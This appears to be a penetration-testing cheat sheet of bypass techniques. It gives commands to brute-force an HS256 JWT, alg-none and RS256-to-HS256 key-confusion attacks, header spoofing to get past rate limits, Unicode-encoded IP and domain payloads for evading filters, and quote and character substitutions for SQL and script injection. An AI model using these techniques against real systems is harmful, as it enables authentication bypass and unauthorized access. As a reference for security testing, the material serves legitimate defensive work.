# Bypasses

## Auth

### **JWT**

#### **Bruteforce**

Symmetric algorithms are vulnerable to the local bruteforce attack.

* HS256
* HS512
* HS...

You can try to brute such algorithms to issue a new JWT.

```bash
git clone https://github.com/Sjord/jwtcrack.git
cd jwtcrack

#Bruteforce using crackjwt.py
python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt

#Bruteforce using john
python jwt2john.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc > jwt.john
john jwt.john #It does not work with Kali-John
```

#### **Alg: none**

Set the algorithm used as "None" and remove the signature part. ****

#### **Change** asymmetric alg to symmetric

If you change the algorithm from RS256 to HS256, the back end code uses the public key as the secret key and then uses the HS256 algorithm to verify the signature.

Then, using the public key and changing SR256 to HS256 we could create a valid signature. You can retrieve the certificate of the web server executing this: 

```bash
openssl s_client -connect example.com:443 2>&1 < /dev/null | sed -n '/-----BEGIN/,/-----END/p' > certificatechain.pem 
openssl x509 -pubkey -in certificatechain.pem -noout > pubkey.pem
```

For this attack you can use the JOSEPH Burp extension. 

1. In the Repeater tab select the JWS tab and select the Key confusion attack. 
2. Load the PEM, Update the request and send it. \(This extension allows you to send the "non" algorithm attack also\).

It is also recommended to use the tool jwt\_tool with the option 2 as the previous Burp Extension does not always works well

### **Password reset links**

They can be:

* Predictable You need to know the generation algorithm to generate your own link
* Reusable Try to look for leaked tokens
* Leaked 90% you can see them in some marketing systems

### **Custom logic**

* Reinvented session algorithms All sessions must be at least:

  * Not predictable
  * Unique
  * Revocable
  * Time limited

  Are you sure, that you did not forget about all such properties in your custom algorithm?

* Custom cryptography, based on obscurity Try to get the app source code and all such security will fall

### 2FA

#### User mapping

It can be not mapped to the user account.  
If so, just try to use an already created token from the account to authenticate.

#### Reusing

Maybe you can reuse an already used token inside the account to authenticate.



## Rate limits

```text
X-Originating-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Forwarded-Host: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1

#or use double X-Forwared-For header
X-Forwarded-For:
X-Forwarded-For: 127.0.0.1

Forwarded: for=127.0.0.1; host=127.0.0.1
```

## Filters

### **Dot & digits**

[http://⑯⑨](http://xn--wrhn)。②⑤④。⑯⑨｡②⑤④/

[http://⓪ⓧⓐ⑨](http://xn--wrhznmcl)｡⓪ⓧⓕⓔ｡⓪ⓧⓐ⑨｡⓪ⓧⓕⓔ:80/

[http://⓪ⓧⓐ⑨ⓕⓔⓐ⑨ⓕⓔ:80/](http://xn--wrha42abtcdd9m3a:80/)

[http://②⑧⑤②⓪③⑨①⑥⑥:80/](http://xn--orhbaeijakm21k:80/)

[http://④②⑤](http://xn--prhde)｡⑤①⓪｡④②⑤｡⑤①⓪:80/

[http://⓪②⑤①](http://xn--orhbj84c)。⓪③⑦⑥。⓪②⑤①。⓪③⑦⑥

![](../../.gitbook/assets/image%20%281%29.png)

### **Quote**

* DB
  * $$
  * CHR\(39\)
* %27 / %22

## Special characters

### Dot

```text
evil.com = evil。com = evil%25E3%2580%2582com
```

### Slashes

```text
Python example (2 slashes in advance are for this language escaping)
/ = \\\\\\\\x2f
\\ = \\\\\\\\x5c
```

### Spaces

```text
SQL:
' ' = + = /**/
```

### Quotes

```text
SQL:
' = $$
JS:
' = `
```

### Other

![](../../.gitbook/assets/image%20%282%29.png)

```text
< ~ %e2%89%ae
< ~ %ef%b9%a4
< ~ %ef%bc%9c
> ~ %u226e
> ~ %e2%89%af
> ~ %ef%b9%a5
> ~ %ef%bc%9e
```

\([https://appcheck-ng.com/unicode-normalization-vulnerabilities-the-special-k-polyglot/\#](https://appcheck-ng.com/unicode-normalization-vulnerabilities-the-special-k-polyglot/#)\)

